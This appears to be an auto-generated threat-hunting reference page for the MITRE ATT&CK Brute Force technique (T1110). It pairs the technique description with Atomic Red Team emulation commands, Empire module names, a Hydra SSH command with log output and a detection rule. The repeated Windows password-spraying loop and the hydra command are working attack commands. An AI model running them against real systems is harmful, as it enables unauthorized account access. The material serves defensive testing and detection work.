
# Brute Force

## Description

### MITRE Description

> Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

A related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)


In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows', 'Office 365', 'Azure AD', 'SaaS']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1110

## Potential Commands

```
net user /domain > DomainUsers.txt
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL

net user /domain > #{input_file_users}
echo "Password1" >> passwords.txt
echo "1q2w3e4r" >> passwords.txt
echo "Password!" >> passwords.txt
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL

net user /domain > #{input_file_users}
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\COMPANYDC1\IPC$ /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL

net user /domain > #{input_file_users}
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL

powershell/recon/get_sql_server_login_default_pw
powershell/recon/get_sql_server_login_default_pw
powershell/recon/http_login
powershell/recon/http_login
powershell/situational_awareness/network/smbautobrute
powershell/situational_awareness/network/smbautobrute
powershell/situational_awareness/network/smbscanner
powershell/situational_awareness/network/smbscanner
Shell
root @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: //192.168.159.132 -V
Hydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.
auth.log
Log
Failed password for root from 192.168.159.129 port 43728 ssh2
audit.log
Log
type = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: authentication acct = "root" exe = "/ usr / sbin / sshd" hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = ssh res = failed '
```

## Commands Dataset

```
[{'command': 'net user /domain > DomainUsers.txt\n'
             'echo "Password1" >> #{input_file_passwords}\n'
             'echo "1q2w3e4r" >> #{input_file_passwords}\n'
             'echo "Password!" >> #{input_file_passwords}\n'
             '@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in '
             '(#{input_file_passwords}) DO @net use #{remote_host} '
             '/user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use '
             '/delete #{remote_host} > NUL\n',
  'name': None,
  'source': 'atomics/T1110/T1110.yaml'},
 {'command': 'net user /domain > #{input_file_users}\n'
             'echo "Password1" >> passwords.txt\n'
             'echo "1q2w3e4r" >> passwords.txt\n'
             'echo "Password!" >> passwords.txt\n'
             '@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in '
             '(passwords.txt) DO @net use #{remote_host} /user:#{domain}\\%n '
             '%p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete '
             '#{remote_host} > NUL\n',
  'name': None,
  'source': 'atomics/T1110/T1110.yaml'},
 {'command': 'net user /domain > #{input_file_users}\n'
             'echo "Password1" >> #{input_file_passwords}\n'
             'echo "1q2w3e4r" >> #{input_file_passwords}\n'
             'echo "Password!" >> #{input_file_passwords}\n'
             '@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in '
             '(#{input_file_passwords}) DO @net use \\\\COMPANYDC1\\IPC$ '
             '/user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use '
             '/delete \\\\COMPANYDC1\\IPC$ > NUL\n',
  'name': None,
  'source': 'atomics/T1110/T1110.yaml'},
 {'command': 'net user /domain > #{input_file_users}\n'
             'echo "Password1" >> #{input_file_passwords}\n'
             'echo "1q2w3e4r" >> #{input_file_passwords}\n'
             'echo "Password!" >> #{input_file_passwords}\n'
             '@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in '
             '(#{input_file_passwords}) DO @net use #{remote_host} '
             '/user:YOUR_COMPANY\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net '
             'use /delete #{remote_host} > NUL\n',
  'name': None,
  'source': 'atomics/T1110/T1110.yaml'},
 {'command': 'powershell/recon/get_sql_server_login_default_pw',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/recon/get_sql_server_login_default_pw',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/recon/http_login',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/recon/http_login',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/smbautobrute',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/smbautobrute',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/smbscanner',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/smbscanner',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'Shell\n'
             'root @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: '
             '//192.168.159.132 -V\n'
             'Hydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in '
             'military or secret service organizations, or for illegal '
             'purposes.',
  'name': 'Shell',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'auth.log',
  'name': 'auth.log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Log\n'
             'Failed password for root from 192.168.159.129 port 43728 ssh2',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'audit.log',
  'name': 'audit.log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Log\n'
             'type = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 '
             "uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: "
             'authentication acct = "root" exe = "/ usr / sbin / sshd" '
             'hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = '
             "ssh res = failed '",
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json
[{'data_source': '/var/log/secure'}]
```

## Potential Queries

```json
[{'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: linux under ssh brute force\n'
           'description: Ubuntu18.04, kali\n'
           'references:\n'
           'tags: T1110\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: linux\n'
           '\xa0\xa0\xa0\xa0service: auth.log / audit.log\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0keywords:\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0- 'Failed password for * ssh2' #linux "
           'auth.log\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0- \'* exe = "/ usr / sbin / sshd" * '
           "terminal = ssh res = failed' #linux audit.log\n"
           '\xa0\xa0\xa0\xa0condition: keywords\n'
           'level: medium'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Brute Force Credential Access': {'atomic_tests': [{'description': 'Creates '
                                                                                            'username '
                                                                                            'and '
                                                                                            'password '
                                                                                            'files '
                                                                                            'then '
                                                                                            'attempts '
                                                                                            'to '
                                                                                            'brute '
                                                                                            'force '
                                                                                            'on '
                                                                                            'remote '
                                                                                            'host\n',
                                                                             'executor': {'command': 'net '
                                                                                                     'user '
                                                                                                     '/domain '
                                                                                                     '> '
                                                                                                     '#{input_file_users}\n'
                                                                                                     'echo '
                                                                                                     '"Password1" '
                                                                                                     '>> '
                                                                                                     '#{input_file_passwords}\n'
                                                                                                     'echo '
                                                                                                     '"1q2w3e4r" '
                                                                                                     '>> '
                                                                                                     '#{input_file_passwords}\n'
                                                                                                     'echo '
                                                                                                     '"Password!" '
                                                                                                     '>> '
                                                                                                     '#{input_file_passwords}\n'
                                                                                                     '@FOR '
                                                                                                     '/F '
                                                                                                     '%n '
                                                                                                     'in '
                                                                                                     '(#{input_file_users}) '
                                                                                                     'DO '
                                                                                                     '@FOR '
                                                                                                     '/F '
                                                                                                     '%p '
                                                                                                     'in '
                                                                                                     '(#{input_file_passwords}) '
                                                                                                     'DO '
                                                                                                     '@net '
                                                                                                     'use '
                                                                                                     '#{remote_host} '
                                                                                                     '/user:#{domain}\\%n '
                                                                                                     '%p '
                                                                                                     '1>NUL '
                                                                                                     '2>&1 '
                                                                                                     '&& '
                                                                                                     '@echo '
                                                                                                     '[*] '
                                                                                                     '%n:%p '
                                                                                                     '&& '
                                                                                                     '@net '
                                                                                                     'use '
                                                                                                     '/delete '
                                                                                                     '#{remote_host} '
                                                                                                     '> '
                                                                                                     'NUL\n',
                                                                                          'elevation_required': False,
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'domain': {'default': 'YOUR_COMPANY',
                                                                                                            'description': 'Domain '
                                                                                                                           'name '
                                                                                                                           'of '
                                                                                                                           'the '
                                                                                                                           'target '
                                                                                                                           'system '
                                                                                                                           'we '
                                                                                                                           'will '
                                                                                                                           'brute '
                                                                                                                           'force '
                                                                                                                           'upon',
                                                                                                            'type': 'String'},
                                                                                                 'input_file_passwords': {'default': 'passwords.txt',
                                                                                                                          'description': 'Path '
                                                                                                                                         'to '
                                                                                                                                         'a '
                                                                                                                                         'file '
                                                                                                                                         'containing '
                                                                                                                                         'a '
                                                                                                                                         'list '
                                                                                                                                         'of '
                                                                                                                                         'passwords '
                                                                                                                                         'we '
                                                                                                                                         'will '
                                                                                                                                         'attempt '
                                                                                                                                         'to '
                                                                                                                                         'brute '
                                                                                                                                         'force '
                                                                                                                                         'with',
                                                                                                                          'type': 'Path'},
                                                                                                 'input_file_users': {'default': 'DomainUsers.txt',
                                                                                                                      'description': 'Path '
                                                                                                                                     'to '
                                                                                                                                     'a '
                                                                                                                                     'file '
                                                                                                                                     'containing '
                                                                                                                                     'a '
                                                                                                                                     'list '
                                                                                                                                     'of '
                                                                                                                                     'users '
                                                                                                                                     'that '
                                                                                                                                     'we '
                                                                                                                                     'will '
                                                                                                                                     'attempt '
                                                                                                                                     'to '
                                                                                                                                     'brute '
                                                                                                                                     'force',
                                                                                                                      'type': 'Path'},
                                                                                                 'remote_host': {'default': '\\\\COMPANYDC1\\IPC$',
                                                                                                                 'description': 'Hostname '
                                                                                                                                'of '
                                                                                                                                'the '
                                                                                                                                'target '
                                                                                                                                'system '
                                                                                                                                'we '
                                                                                                                                'will '
                                                                                                                                'brute '
                                                                                                                                'force '
                                                                                                                                'upon',
                                                                                                                 'type': 'String'}},
                                                                             'name': 'Brute '
                                                                                     'Force '
                                                                                     'Credentials',
                                                                             'supported_platforms': ['windows']}],
                                                           'attack_technique': 'T1110',
                                                           'display_name': 'Brute '
                                                                           'Force '
                                                                           'Credential '
                                                                           'Access'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1110',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/recon/get_sql_server_login_default_pw":  '
                                                                                 '["T1110"],',
                                            'Empire Module': 'powershell/recon/get_sql_server_login_default_pw',
                                            'Technique': 'Brute Force'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1110',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/recon/http_login":  '
                                                                                 '["T1110"],',
                                            'Empire Module': 'powershell/recon/http_login',
                                            'Technique': 'Brute Force'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1110',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/network/smbautobrute":  '
                                                                                 '["T1110"],',
                                            'Empire Module': 'powershell/situational_awareness/network/smbautobrute',
                                            'Technique': 'Brute Force'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1110',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/situational_awareness/network/smbscanner":  '
                                                                                 '["T1110"],',
                                            'Empire Module': 'powershell/situational_awareness/network/smbscanner',
                                            'Technique': 'Brute Force'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations

None

# Actors


* [Turla](../actors/Turla.md)

* [Leafminer](../actors/Leafminer.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT3](../actors/APT3.md)
    
* [APT33](../actors/APT33.md)
    
* [APT41](../actors/APT41.md)
    
